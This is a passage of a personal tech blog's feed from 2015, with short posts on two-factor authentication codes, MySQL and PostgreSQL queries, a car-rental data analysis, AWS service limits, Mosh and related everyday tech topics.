   <content:encoded><![CDATA[
<p>The purpose of two factor authentication is to prevent unauthorized access to your accounts by requiring a device other than a password to verify that it’s actually you. Usually this is a text message to a phone or an app such as Authy or Google Authenticator. Being paranoid and despite the inconvenience I chose to do it for the vast majority of my accounts that support it but some are significantly more secure than others.</p>

<p>In particular, developers need to be careful when doing text message based authentication and make sure the code is not visible during a lock screen. Twitter includes the login code as the first word in the message whereas Bank of America does it right and makes sure the code is not visible without unlocking the screen. It’s a seemingly tiny difference but highlights how important it is to get security right.</p>

<div class="row">
	<div class="span3">
		<div class="thumbnail">
			<img src="http://dangoldin.com/assets/static/images/tfa-boa.png" width="540" height="960" layout="responsive"/>
			<p>Bank of America obfuscating the code</p>
		</div>
	</div>
	<div class="span3 offset1">
		<div class="thumbnail">
			<img src="http://dangoldin.com/assets/static/images/tfa-twitter.png" width="540" height="960" layout="responsive"/>
			<p>Twitter including the code on the lock screen</p>
		</div>
	</div>
</div>

<p><br /></p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Edmunds API</title>
   <link href="http://dangoldin.com/2015/06/19/the-edmunds-api/"/>
   <updated>2015-06-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/19/the-edmunds-api</id>
   <content:encoded><![CDATA[
<p>As part of the <a href="/2015/06/07/finding-the-optimal-car-to-list-on-relayrides/">RelayRides analysis</a> I needed to estimate the price of a car and stumbled across the <a href="http://developer.edmunds.com/" target="_blank">Edmunds API</a>. I came in with some low expectations but was pleasantly surprised by how well it worked. I thought I’d need to go through a data cleanup process to make sure I was using the correct arguments in the HTTP requests but somewhat remarkably the Edmunds API was able to properly handle nearly every request.</p>

<p>It’s unbelievable how happy a good API makes me. Dealing with various edge cases is a huge time suck so having an API that works as expected the first time you try it is incredibly refreshing and highlights the amount of crappy APIs we’ve all had to deal with. I’d expect this to come from a small, product focused company or at least be built in house but it turns out Edmunds partnered with <a href="http://www.mashery.com/" target="_blank">Mashery</a> to develop their API. It definitely makes a case against keeping development in house.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smartphone productivity</title>
   <link href="http://dangoldin.com/2015/06/13/smartphone-productivity/"/>
   <updated>2015-06-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/13/smartphone-productivity</id>
   <content:encoded><![CDATA[
<p>Smartphones are supposed to be the next big wave but I can’t get myself to be productive on them. Every action takes an order of magnitude longer than it would on a regular computer which prevents from me from starting it in the first place. The challenge is that I’m a power user on a computer able to leverage shortcuts across a variety of programs to be extremely productive. The cost is that when I switch to a phone it’s impossible for me to attain that level of speed which is extremely frustrating.</p>

<p>I see that others are spending a ton of time on their phones and are using it to replace a variety of activities they’d normally do on a full fledged computer but I’m not able to do the same. I wonder what impact this has. Smartphones are great for consumption but I wonder whether they actually improve people’s productivity. It’s much better than not having any digital device and is definitely helping get more people digitally connected but I can’t imagine them replacing actual computers in the short term. What will make smartphones more productive is when they start understanding our intent and predicting what we actually want to do. Something akin to Google Now but instead of showing us what we want to see allowing us to create what we want to create.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A MySQL “GROUP BY” nuance</title>
   <link href="http://dangoldin.com/2015/06/09/a-mysql-group-by-nuance/"/>
   <updated>2015-06-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/09/a-mysql-group-by-nuance</id>
   <content:encoded><![CDATA[
<p>I discovered a nuance with MySQL’s GROUP BY statement earlier today that I’ll share with the hope that others can learn from it. It’s fairly common to use a coalesce statement to handle null values while keeping the resulting field the same name. For example:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">coalesce</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">user_id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">other_user_id</span><span class="p">)</span> <span class="k">as</span> <span class="n">user_id</span><span class="p">,</span> <span class="k">sum</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">num</span><span class="p">)</span> <span class="k">as</span> <span class="n">total_nums</span>
<span class="k">FROM</span> <span class="n">table_a</span> <span class="n">a</span>
<span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">table_b</span> <span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">some_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">some_other_id</span>
<span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">stats</span> <span class="n">s</span> <span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">stat_id</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">id</span>
<span class="k">GROUP</span> <span class="k">BY</span> <span class="n">user_id</span><span class="p">;</span></code></pre></figure>

<p>The nuance is that we want the GROUP BY to apply to the entire coalesce expression but as it’s written it only applies to the user_id column from table_a. This has potential to give odd results in more complicated queries. The only fact I even discovered it was that it was causing a duplicate key constraint violation in another table. The solution is quite simple but annoying - you have to use the entire coalesce expression within the GROUP BY statement:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">coalesce</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">user_id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">other_user_id</span><span class="p">)</span> <span class="k">as</span> <span class="n">user_id</span><span class="p">,</span> <span class="k">sum</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">num</span><span class="p">)</span> <span class="k">as</span> <span class="n">total_nums</span>
<span class="k">FROM</span> <span class="n">table_a</span> <span class="n">a</span>
<span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">table_b</span> <span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">some_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">some_other_id</span>
<span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">stats</span> <span class="n">s</span> <span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">stat_id</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">id</span>
<span class="k">GROUP</span> <span class="k">BY</span> <span class="n">coalesce</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">user_id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">other_user_id</span><span class="p">);</span></code></pre></figure>

<p>The reason this solution is messy is that it’s very easy to update the SELECT but forget to update the GROUP BY. This won’t throw an error and MySQL will execute the query just fine - the results just may be unexpected. What I’ve started doing is renaming the resulting column and using that within the GROUP BY:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">coalesce</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">user_id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">other_user_id</span><span class="p">)</span> <span class="k">as</span> <span class="n">final_user_id</span><span class="p">,</span> <span class="k">sum</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">num</span><span class="p">)</span> <span class="k">as</span> <span class="n">total_nums</span>
<span class="k">FROM</span> <span class="n">table_a</span> <span class="n">a</span>
<span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">table_b</span> <span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">some_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">some_other_id</span>
<span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">stats</span> <span class="n">s</span> <span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">stat_id</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">id</span>
<span class="k">GROUP</span> <span class="k">BY</span> <span class="n">final_user_id</span><span class="p">;</span></code></pre></figure>

<p>This makes the query a bit more complicated but it’s being explicit about what we want and avoids hidden errors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Finding the optimal car to list on RelayRides</title>
   <link href="http://dangoldin.com/2015/06/07/finding-the-optimal-car-to-list-on-relayrides/"/>
   <updated>2015-06-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/06/07/finding-the-optimal-car-to-list-on-relayrides</id>
   <content:encoded><![CDATA[
<p>After discovering and browsing <a href="https://relayrides.com/">RelayRides</a> I noticed that there were some users that had multiple cars available for rent. Clearly they weren’t using each of their cars and were using RelayRides exclusively as a revenue generating business rather than renting a car out when it wasn’t being used. This got me thinking about what the best car would be to rent on RelayRides if my goal was solely to maximize my return.</p>

<p>There were only a couple of factors at play here: the initial cost of the car, the price the car will rent at, and how often the car is rented. By combining these values we can come up with a ratio of car price to expected revenue per day. The challenge was in getting this data but it turned out to be surprisingly easy.</p>

<p>My first attempt was to simply scrape RelayRides but I ran into a variety of issues with the authentication process and not being able to evaluate JavaScript via a Python script so I switched gears. My second attempt was a lot simpler but got me what I wanted - after doing a search I opened the network tab in Google Chrome and examined the HTTP requests being made. One of these was to the /search endpoint which gave me a JSON feed of the 200 most relevant cars as well as their make, model, year, the daily rate, the listing time, as well as the total number of trips taken. All I needed to do was dump it into a file and start writing a quick script to start parsing and analyzing the data.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/relay-rides-screenshot.png" alt="RelayRides /search endpoint" width="1433" height="795" layout="responsive"/>
</div>

<p>The next step was actually getting the price of a car. Once again I thought this would be a problem but it turns out the <a href="http://developer.edmunds.com/" target="_blank">Edmunds API</a> was perfect for this. It’s entirely free and amazingly worked in nearly all cases with the data I was able to get from RelayRides. The API was smart enough to take the make, model, and year from the RelayRides and provide an estimated price without any sort of data cleaning of transformation. The only issue I ran into was a few rate limiting errors when I decided to parallelize my script but the fix was to just introduce a delay between consecutive requests and retry if I ever encountered an issue.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/relay-rides-analysis-excel.png" alt="Final result of the analysis" width="1140" height="748" layout="responsive"/>
</div>

<p>Combining the RelayRides data with the Edmunds API and doing some simple math gave me the answer I was looking for - a 2008 Toyota Prius. There were a few cars that had a better expected return but they also had very few trips taken and weren’t listed for long which leads me to believe that their return won’t last. For the most part, the rental rate ends up being highly correlated with the price of the car - the most expensive in my dataset was a 2011 Mercedes G-Class which is listed at a $550/day and has an estimated cost of $80k while the cheapest was a 2003 Ford Taurus that’s listed at $32/day and has an estimated cost of $4k. In general, the market seems pretty balanced in terms of price but there’s a wide variance in how often different cars get rented out - it’s clearly proportional to price but there’s definitely something else there. Unfortunately, this approach only lets us examine the cars that are actually listed and won’t let us predict how a random car would do. In the future I might take a stab at running a regression to generalize this approach but the challenge will be in figuring out the relevant factors.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/car-price-vs-daily-rate.png" alt="Car prive vs daily rental rate" width="828" height="617" layout="responsive"/>
</div>

<p>As usual, the code’s up on <a href="https://github.com/dangoldin/relay-rides-analysis">GitHub</a> and I’d love to hear ideas or thoughts on how to improve the code or the analysis.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Date range generation</title>
   <link href="http://dangoldin.com/2015/05/30/date-range-generation/"/>
   <updated>2015-05-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/30/date-range-generation</id>
   <content:encoded><![CDATA[
<p>I finally had the chance to go back and add <a href="https://dangoldin.github.io/js-tools/#tab-date-generation" target="_blank">another quick tool</a> to my JavaScript arsenal. This one lets you specify a start date, an end date, a step size and interval, along with a desired date format and it will generate the dates in between. This is a surprisingly common activity for me. Every time I need to split a query into multiple date ranges or come up with a series of arguments for various jobs I end up using Excel to come up with the appropriate date ranges. By having it available via the web it makes it a lot easier to generate exactly what I need as well as provides the flexibility to keep on improving. If there are any improvements you’d like to see or if anything is unclear definitely let me know.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/date-range-generation.png" alt="Screenshot of date range tool in action" width="802" height="428" layout="responsive"/>
</div>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dealing with a stripped screw</title>
   <link href="http://dangoldin.com/2015/05/26/dealing-with-a-stripped-screw/"/>
   <updated>2015-05-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/26/dealing-with-a-stripped-screw</id>
   <content:encoded><![CDATA[
<p>Note that this is straying a bit far from my usual posts but I thought it would be helpful for anyone that’s had to deal with a stripped screw or a broken screw head. In my haste I used the wrong driver bit and completely stripped the screw head. It was deep enough that I wasn’t able to extract it using pliers while being so stripped that none of my screwdrivers had enough grip to finish screwing it in. After a bunch of failed ideas I finally stumbled unto a solution that worked and could have helped me over the years. The idea is to use a drill/driver but instead of using a bit in the head you tighten it around the stripped screw. Then when it’s tight around the screw you drive it in until it’s where you want it to be. The other option is to use this approach to get the screw out and replace it with a brand new one to make sure it’s able to removable in the future.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google Chrome knows what's best for me</title>
   <link href="http://dangoldin.com/2015/05/25/google-chrome-knows-whats-best-for-me/"/>
   <updated>2015-05-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/25/google-chrome-knows-whats-best-for-me</id>
   <content:encoded><![CDATA[
<p>Earlier today I wanted to check up on my electricity bill but ran into an issue trying to login to my PSEG account. Turns out that my nightly version of Google Chrome is preventing me from logging into their site since it has a poor HTTPS configuration. Instead of seeing the login page I get the following message: “Server has a weak ephemeral Diffie-Hellman public key”. Luckily for me this only happened in the nightly build and I was able to login using both the nightly version of Firefox and the standard version of Chrome.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/chrome-pseg-security.png" alt="Chrome not letting me login to PSEG" width="661" height="541" layout="responsive"/>
</div>

<p>I wonder whether Google’s making the right decision here. What happens when they propagate these changes down to the standard versions of Chrome and countless people start having issues paying their bills. I understand that Google wants sites to upgrade their security but there will be a ton of disruption in the interim. Especially on sites people use to manage their lives. I’m just hoping that the sites that need to upgrade their security do so before Chrome updates itself.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The decline of niche tools</title>
   <link href="http://dangoldin.com/2015/05/22/the-decline-of-niche-tools/"/>
   <updated>2015-05-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/22/the-decline-of-niche-tools</id>
   <content:encoded><![CDATA[
<p>I have a few sites that are “first stops” for specific use cases. I’ll go to Google Maps for directions, Foursquare for ideas of where to go, and Amazon whenever I need to buy something. They’re great most of the time but what’s interesting is what happens in the failure case. At that point my primary tool is no longer sufficient and I need to move on to secondary options. In these cases I tend to not have a well defined set of fallback options - for most of them I’ll fall back to the general case of using Google and then exploring from the search results. The only clear exception is Foursquare in which case I’ll go to Yelp before moving on to a general Google search. What’s surprising is that the fall back option usually leads to a successful outcome. Maybe I should switch my approach to start with the general search first and only move on to the specific tools when it fails. I wonder if we’re converging to a world run by fewer, smarter, and more powerful apps. <a href="http://dangoldin.com/2013/07/21/beware-the-data-monopoly/" target="_blank">Data begets data</a> and as we supply more of it to the leaders we entrench their position, making it significantly harder for new companies to launch. We need regulation that enforces data mobility and allows people to export all the data that they’ve contributed and share it with whoever they’d like.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Experts, time, and quality</title>
   <link href="http://dangoldin.com/2015/05/18/experts-time-and-quality/"/>
   <updated>2015-05-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/18/experts-time-and-quality</id>
   <content:encoded><![CDATA[
<p>We live in a world where it’s impractical to be a generalist so we specialize in a subset of skills and go to others for everything else. This works well but there’s still imperfect information - it’s tough to gauge someone’s skill level when you’re not an expert. In fact, when we lack awareness we end up using time spent as a proxy for skill when comparing across service providers. Imagine going to two barbers that charge the same amount for a haircut but one takes 10 minutes and the other takes 30 minutes. Even if we can’t tell the difference between the two haircuts we’d value the 30 minute one more due to the time difference. This seems backwards. The barber that was able to achieve the same result in 10 minutes is the more skilled one but instead we feel swindled when we back the price into an hourly rate. We should be willing to pay more for the 10 minute haircut since it gives us more time for our own pursuits. Yet when we lack knowledge we opt for the shortcut of equating time and skill. I’m trying to break this tendency by thinking about the end result rather than the effort and time involved. It’s interesting to compare this to software development. I know that just because someone spent more time on a project doesn’t mean it’s better than someone who knocked it out yet I still view other skilled professions from a “time equals quality” perspective. It makes you wonder whether professionals in other industries have a similar mindset where they realize time spent isn’t an indicator of quality in their own profession yet view it as a sign of quality in others.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Taking spontaneous notes</title>
   <link href="http://dangoldin.com/2015/05/17/taking-spontaneous-notes/"/>
   <updated>2015-05-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/17/taking-spontaneous-notes</id>
   <content:encoded><![CDATA[
<p>Many of my thoughts come serendipitously - whether it’s an errand I need to run, an idea for a blog post, or a feature I should build into one of my projects. But unless I’m able to jot it down soon after it slips my mind until I have another serendipitous thought to bring it back. It’s frustrating when I know I had something but can’t recall what the actual thought.</p>

<p>A smartphone makes it a lot easier since I can always jot down some words to trigger the thought later on and I’ve also started carrying a small notebook for times I’d just like some pen and paper. Unfortunately, there are still a few cases where this approach doesn’t work. One is when I’m in a group and don’t want to bust out my phone and start taking notes. The others are where a phone just isn’t practical - whether I’m out exercising and don’t want to take a break, in bed where I don’t want to stare at a bright screen, or just in the shower. In those cases I’d love something akin to mind reading where I’d be able to just back up a thought to a place that I can reference later. The only idea I’ve had is a braille-like system that lets you enter the worlds tactilely. Imagine having a small device in your pocket that you can run your fingers over to type whatever you’d like. You’d be able to do this regardless of the location - whether you’re in bed or in a crowded subway car with your hand in a pocket. I’d love to see a Kickstarter for this.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mosh trumps shoddy internet</title>
   <link href="http://dangoldin.com/2015/05/12/mosh-trumps-shoddy-internet/"/>
   <updated>2015-05-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/12/mosh-trumps-shoddy-internet</id>
   <content:encoded><![CDATA[
<p>Since I do a fair amount of web development having flaky internet is a big hit to my productivity; especially when I have a half dozen open SSH sessions that bulk disconnect every few minutes. After being thwarted one too many times by spotty internet at the office I decided I had enough and started looking for alternatives. One of the tools I discovered was <a href="https://mosh.mit.edu/" target="_blank">Mosh</a>. Mosh allows you to open a remote session just like you would do with SSH but unlike SSH it’s robust enough to handle networking disruptions. In fact, I can start a Mosh session on Friday afternoon before leaving the office for the weekend, let my computer go to sleep, and then have it automatically resume as soon as I get back to the office on Monday and wake my computer up. I’m still amazed at how well it works and only wish I discovered it sooner.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Driving before GPS</title>
   <link href="http://dangoldin.com/2015/05/09/driving-before-gps/"/>
   <updated>2015-05-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/09/driving-before-gps</id>
   <content:encoded><![CDATA[
<p>I’ve been thinking about driving before GPS. I remember my family having an atlas in the backseat that we’d reference for long trips and actually map out our journey - which roads to take, which exits to get off of exits, and the distances involved. My clearest memory was constantly trying to figure out whether we missed an exit or not. The usual solution was to just pay attention for the next couple of minutes and try to use the signs along with the road atlas to figure out where you were on the map. Now, you just type in the destination on your smartphone as soon as you get the car and just start driving. Even if you make a mistake the directions automatically update to correct your course. The amount of time saved by GPS for every trip that no longer needs to be preplanned or adjusted enroute must be incredible. I suspect it’s also changed the type of trips we’re making - rather than going to the same old nearby spots that we know we can get to, we’re confident enough to go beyond that and discover something new, knowing that our phones will bail us out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Computer show fliers from the mid 1990s</title>
   <link href="http://dangoldin.com/2015/05/06/computer-show-fliers-from-the-mid-1990s/"/>
   <updated>2015-05-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/06/computer-show-fliers-from-the-mid-1990s</id>
   <content:encoded><![CDATA[
<p>While doing some spring cleaning I discovered a bunch of fliers from various computer shows I attended in the mid 90s. Bsed on the Windows 95 and Windows NT promotions I suspect this must have been in 1995 or 1996. What’s striking is how much better our computers are. It’s one thing to be abstractly aware of Moore’s Law but shocking to actually see it. The top of the line model in 1995 was $2,500 and came with a 4 GB hard drive, 64 MB of RAM, a 200 MHz processor, and a 33.6 kbps modem. Adjusting for inflation, this is equivalent to $3,700 in 2015 dollars. With that budget you can a top of the line computer with an order of magnitude more of everything and still have enough leftover for a smartphone which is also an order of magnitude more powerful than a computer from the mid 1990s.</p>

<ul class="thumbnails">

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-1.jpg" alt="Flier 1" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-2.jpg" alt="Flier 2" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-3.jpg" alt="Flier 3" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-4.jpg" alt="Flier 4" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-5.jpg" alt="Flier 5" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-6.jpg" alt="Flier 6" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-7.jpg" alt="Flier 7" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-8.jpg" alt="Flier 8" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-9.jpg" alt="Flier 9" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-10.jpg" alt="Flier 10" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-11.jpg" alt="Flier 11" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-12.jpg" alt="Flier 12" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-13.jpg" alt="Flier 13" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-14.jpg" alt="Flier 14" width="1632" height="1224" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-15.jpg" alt="Flier 15" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flier-16.jpg" alt="Flier 16" width="1224" height="1632" layout="responsive"/>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A unique solution to every problem</title>
   <link href="http://dangoldin.com/2015/05/02/a-unique-solution-to-every-problem/"/>
   <updated>2015-05-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/05/02/a-unique-solution-to-every-problem</id>
   <content:encoded><![CDATA[
<p>A thought experiment I’ve had on my mind is this idea of a programming language that only has a single way of solving every programming problem. Regardless of the problem, multiple people writing code independently would end up with the same exact code. No such language actually exists (yet) but it’s fun to think about extreme cases in order to understand where we stand now. With this programming language the only differentiation between developers would be time since the end result would be the same. Beyond that, if there was always a unique solution to every problem this language would be able to write the code itself.</p>

<p>On the other extreme you have current languages which provide a ton of flexibility with dozens of ways to solve a simple problem. In this world developer skills are paramount. You want to make sure you find the approach that solves the current problem but is also written in a way that’s flexible enough to be easily modified for whatever the future brings. Enforcing a structure that’s based on best practices makes it easy to write code that grows with the team.</p>

<p>A great example of this is the rise of JavaScript frameworks. JavaScript is extremely flexible and gives the developer a wide range of paradigms to choose from. This leads to the same problem being solved hundreds of different ways depending on the style and mood of the author. The fact that it actually has a book dedicated to the “<a href="http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742" target="_blank">good parts</a>” highlights how flexible the language is and how easy it is to go off track. Despite being close to twenty years old, only now are we seeing frameworks being developed that take a very opinionated view of how JavaScript should be written. There’s nothing in the language itself to enforce a standard so each framework takes on the responsibility. This allows large teams to collaborate on large projects without having to worry as much about individual styles and decisions.</p>

<p>Software engineering is a new industry and I suspect we’ll see more and more standardization as it evolves. The current approach is to use general languages for a wide range of problem domains but I think we’ll start seeing more and more languages that are specialized by problem domain. This won’t get us to the language with a single way of doing things but it will it a lot simpler to solve problems in a well defined and standard way.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A few days with Google Contributor</title>
   <link href="http://dangoldin.com/2015/04/28/a-few-days-with-google-contributor/"/>
   <updated>2015-04-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/28/a-few-days-with-google-contributor</id>
   <content:encoded><![CDATA[
<p>Near the end of last year, Google announced the <a href="https://contributor.google.com" target="_blank">Contributor</a> program - a way to pay a monthly fee which would then be distributed across the websites you visit. In return, you’d start seeing fewer ads. Earlier this week I got off the waitlist and decided to give it a shot. The signup process was amazingly simple - choose a monthly dollar amount and you’re good to go. The effect is noticeable - on many sites I’ll see a blank spot where an ad should have been. The best part is being able to see how much I’ve contributed to the various sites I visit. Over the past couple of days I’ve spent a little over 60 cents removing 51 ads. An unforeseen effect is that I’m more aware of the content I consume and the sites I visit - seeing that some of my money is going towards shady sites makes me more conscious of my browsing behavior. I’m definitely curious to see where this approach goes.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/google-contributor.png" alt="Some Google Contributor stats" width="668" height="781" layout="responsive"/>
</div>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS service limits</title>
   <link href="http://dangoldin.com/2015/04/26/aws-service-limits/"/>
   <updated>2015-04-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/26/aws-service-limits</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/aws-ec2-launch-failure.png" alt="AWS EC2 launch failure due to service limits" width="960" height="182" layout="responsive"/>
</div>

<p>Something I haven’t seen mentioned much is that AWS has <a href="http://docs.aws.amazon.com/general/latest/gr/aws_service_limits.html" target="_blank">service limits</a>. The only way to find out that you’re hitting one is when an instance fails to launch with the error message “Your quota allows for 0 more running instance(s)” with a link to open a support ticket and request a higher limit.</p>

<p>This is a serious problem when you’re at the instance limit and depend on auto scaling for high loads. The instance limit prevents you from scaling to meet the demand and the only reasonable option is to file a support ticket and hope someone is able to get to it in time. The doomsday option is to temporarily shut down secondary or tertiary instances to make room for the critical ones.</p>

<p>I understand why Amazon chose to implement it but I wish they had better support around messaging when you’re close to the instance limit or whether your current setup can push you over. There’s nowhere in the UI where you can see the limit but luckily there’s a simple command to do it via the <a href="http://aws.amazon.com/cli/" target="_blank">command line interface</a> - aws ec2 describe-account-attributes –region=us-east-1.</p>

<p>If you’re running a quickly growing stack you should make sure to monitor your service limits so you’re not caught unaware. Also make sure to monitor the limits per region and within a VPC as they each have their own.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Adding columns in PostgreSQL and Redshift</title>
   <link href="http://dangoldin.com/2015/04/23/adding-columns-in-postgresql-and-redshift/"/>
   <updated>2015-04-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/04/23/adding-columns-in-postgresql-and-redshift</id>
   <content:encoded><![CDATA[
<p>A frequent event when working with a SQL database is adding a column. Ideally, you’d want to add this column before or after another one that makes sense rather than all the way at the end. MySQL makes this straightforward since you can use the AFTER keyword when adding a column to specify exactly where it should be added. PostgreSQL and Redshift make this difficult since all new columns are automatically added at the end.</p>

<p>Normally, this isn’t a problem in most cases since you just write a query to specify the desired column order but it makes doing a simple “SELECT *” more annoying and will break naive jobs that rely on a particular column order.</p>

<p>The accepted solution is to create a new table with the proper structure, migrate the data from the original table while using a default value for the new column, drop or rename the original table, and then rename the new table with the original name. It’s a lot easier to see this in code:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- The original table</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="c1">-- Let's say we need to add an age column</span>
<span class="c1">-- Create the new table</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_new</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
  <span class="n">age</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="c1">-- Migrate the data</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test_new</span>
  <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">0</span>
